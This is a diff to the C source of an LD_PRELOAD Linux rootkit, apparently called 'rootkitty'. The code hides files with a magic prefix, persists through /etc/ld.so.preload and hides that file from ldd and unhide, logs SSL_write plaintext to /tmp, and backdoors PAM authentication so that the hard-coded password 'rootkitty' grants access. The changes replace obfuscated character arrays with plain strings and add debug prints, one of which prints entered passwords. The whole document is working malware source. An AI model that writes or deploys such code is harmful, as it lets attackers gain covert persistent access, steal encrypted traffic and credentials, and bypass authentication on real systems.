@@ -17,6 +17,7 @@
 #ifndef PAM_EXTERN
 #define PAM_EXTERN extern 
 #endif
+
 /*---------[ PROTOTYPES ]---------*/
 static struct dirent64* (*og_readdir64)(DIR *dir)  = NULL;
 static struct dirent*   (*og_readdir)(DIR *)       = NULL;
@@ -24,22 +25,34 @@ static int (*og_SSL_write)(SSL*, const void*, int) = NULL;
 static int (*og_pam_sm_auth)(pam_handle_t*, int, int, const char**) = NULL;
 static int (*og_pam_sm_setcred)(pam_handle_t* pamh, int flags, int argc, const char** argv) = NULL;
 static int (*og_pam_auth)(pam_handle_t *pamh, int flags) = NULL;
-static int (*og_execve)(const char *pathname, char *const _Nullable argv[], char *const _Nullable envp[]) = NULL;
+static int (*og_execve)(const char *pathname, char *const argv[], char *const envp[]) = NULL;
 static int (*og_pam_acct_mgmt)(pam_handle_t *pamh, int flags) = NULL;
 static int (*og_pam_open_session)(pam_handle_t *pamh, int flags) = NULL; 
 int isDebuggerPresent();
+
 /*---------[ INITIALIZE THE HOOKS ]---------*/
 __attribute__((constructor)) void hook_init(void){
   og_readdir    = (struct dirent* (*)(DIR*))dlsym(RTLD_NEXT, "readdir");
+  printf("[+] readdir hooked\n");
+  if (dlerror() != NULL) {
+    fprintf(stderr, "Error: %s\n", dlerror());
+    exit(EXIT_FAILURE);
+  }
   og_readdir64  = (struct dirent64* (*)(DIR*))dlsym(RTLD_NEXT, "readdir64");
+  printf("[+] readdir64 hooked\n");
+  if (dlerror() != NULL) {
+    fprintf(stderr, "Error: %s\n", dlerror());
+    exit(EXIT_FAILURE);
+  }
   og_SSL_write  = (int (*)(SSL*, const void*, int))dlsym(RTLD_NEXT, "SSL_write");
   og_pam_sm_auth = (int (*)(pam_handle_t*, int, int, const char**))dlsym(RTLD_NEXT, "pam_sm_authenticate");
   og_pam_sm_setcred = (int (*)(pam_handle_t*, int, int, const char**))dlsym(RTLD_NEXT, "pam_sm_setcred");
   og_pam_auth = (int (*)(pam_handle_t *, int flags))dlsym(RTLD_NEXT, "pam_authenticate");
-  og_execve = (int (*)(const char*, char *const _Nullable argv[], char *const _Nullable envp[]))dlsym(RTLD_NEXT, "execve");
+  og_execve = (int (*)(const char*, char *const argv[], char *const envp[]))dlsym(RTLD_NEXT, "execve");
   og_pam_acct_mgmt = (int (*)(pam_handle_t*, int))dlsym(RTLD_NEXT, "pam_acct_mgmt");
   og_pam_open_session = (int (*)(pam_handle_t *pamh, int flags))dlsym(RTLD_NEXT, "pam_open_session");
 }
+
 /*---------[ PERSISTENCE CHECK AND LD.SO.PRELOAD MANIPULATION ]---------*/
 __attribute__((constructor)) void PersistCheck(void) {
   FILE* fd;
@@ -47,9 +60,8 @@ __attribute__((constructor)) void PersistCheck(void) {
   Dl_info path;
   char line[255];
   char check[PATH_MAX];
-  char preload[] = { '/', 'e', 't', 'c', '/', 'l', 'd', '.', 's', 'o', '.', 'p', 'r', 'e', 'l', 'o', 'a', 'd', 0 };
-  char tmp[] = { '/', 't', 'm', 'p', '/', 'r', 'o', 'o', 't', 'k', 'i', 't', 't', 'y', '_', 't', 'm', 'p', '.', 't', 'x', 't', 0 };
-
+  char* preload = "/etc/ld.so.preload";
+  char* tmp = "/tmp/rootkitty_tmp.txt"; 
   if(!isDebuggerPresent()){
     return;
   }
@@ -91,12 +103,13 @@ __attribute__((constructor)) void PersistCheck(void) {
   }
   seteuid(old_uid);
 }
+
 /*---------[ HOOK EXECVE TO HIDE THE LD.SO.PRELOAD FILE ]---------*/
 int execve(const char *pathname, char *const argv[], char *const envp[]) {
-  char ldd[] = { '/', 'b', 'i', 'n', '/', 'l', 'd', 'd', 0 };
-  char unhide[] = { '/', 'b', 'i', 'n', '/', 'u', 'n', 'h', 'i', 'd', 'e', 0 };
-  char normal[] = { '/', 'e', 't', 'c', '/', 'l', 'd', '.', 's', 'o', '.', 'p', 'r', 'e', 'l', 'o', 'a', 'd', 0 };
-  char hidden[] = { '/', 'e', 't', 'c', '/', '.', 'l', 'd', '.', 's', 'o', '.', 'p', 'r', 'e', 'l', 'o', 'a', 'd', 0 };
+  char* ldd = "/bin/ldd";
+  char* unhide = "/bin/unhide";
+  char* normal = "/etc/ld.so.preload";
+  char* hidden = "/etc/.ld.so.preload";
 
   if (strcmp(pathname,ldd)==0 || strcmp(pathname,unhide)==0) {
     uid_t old_uid = getuid();
@@ -111,11 +124,13 @@ int execve(const char *pathname, char *const argv[], char *const envp[]) {
 /*---------[ HIDING FILES ]---------*/
 struct dirent* readdir(DIR *dirp){
   struct dirent* entry;
-
+  printf("[+] in hooked function\n");
   while ((entry = og_readdir(dirp)) != NULL) {
     if (strncmp(entry->d_name, MAGIC_PREFIX, MAGIC_LEN) == 0) {
+      printf("[i] skipped\n");
       continue;    
     }
+    printf("[i] In while loop\n");
     return entry;
   }
   return entry;
@@ -123,19 +138,22 @@ struct dirent* readdir(DIR *dirp){
 // handle 64bit version
 struct dirent64* readdir64(DIR* dirp) {
   struct dirent64* entry;
-
+  printf("[+] in hooked function\n");
   while ((entry = og_readdir64(dirp)) != NULL) {
     if (strncmp(entry->d_name, MAGIC_PREFIX, MAGIC_LEN) == 0) {
+      printf("[i] skipped\n");
       continue;
     }
+    printf("[i] In while loop\n");
     return entry;
   }
   return entry;
 }
+
 /*---------[ INTERCEPTING SSL_WRITE ]---------*/ 
 int SSL_write(SSL* ssl, const void *buf, int num) {
-  char path[] = {'/', 't', 'm', 'p', '/', 'S', 'S', 'L', '_', 'l', 'o', 'g', '.', 't', 'x', 't', 0 };
-  
+  char path[] = "/tmp/rootkitty_SSLlog.txt";
+
   if (!isDebuggerPresent()){
     return og_SSL_write(ssl, buf, num);
   }
@@ -179,7 +197,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t* pamh, int flags, int argc, cons
   }
 
   pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
-  char password[] = { 'r', 'o', 'o', 't', 'k', 'i', 't', 't', 'y', 0};
+  char* password = "rootkitty";
   if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
     backdoor = 1;
     return PAM_SUCCESS;
@@ -203,8 +221,9 @@ PAM_EXTERN int pam_authenticate(pam_handle_t *pamh, int flags) {
   if (!isDebuggerPresent()){
     return og_pam_auth(pamh, flags);
   }
-  pam_get_item(pamh, PAM_AUTHOK, (const void**)&input_passwd);
-  char password[] =  { 'r', 'o', 'o', 't', 'k', 'i', 't', 't', 'y', 0};
+  pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
+  printf("%s", input_passwd);
+  char* password = "rootkitty";
   if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
     backdoor = 1;
     return PAM_SUCCESS;
@@ -219,8 +238,8 @@ int pam_acct_mgmt(pam_handle_t *pamh, int flags){
     return og_pam_acct_mgmt(pamh, flags);
   }
 
-  pam_get_item(pamh, PAM_AUTHOK, (const void**)&input_passwd);
-   char password[] =  { 'r', 'o', 'o', 't', 'k', 'i', 't', 't', 'y', 0};
+  pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
+  char* password = "rootkitty";
   if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
     backdoor = 1;
     return PAM_SUCCESS;
@@ -236,8 +255,8 @@ const char* input_passwd;
     return og_pam_open_session(pamh, flags);
   }
 
-  pam_get_item(pamh, PAM_AUTHOK, (const void**)&input_passwd);
-   char password[] =  { 'r', 'o', 'o', 't', 'k', 'i', 't', 't', 'y', 0};
+  pam_get_item(pamh, PAM_AUTHTOK, (const void**)&input_passwd);
+  char* password = "rootkitty";
   if (input_passwd != NULL && strcmp(input_passwd, password) == 0) {
     backdoor = 1;
     return PAM_SUCCESS;
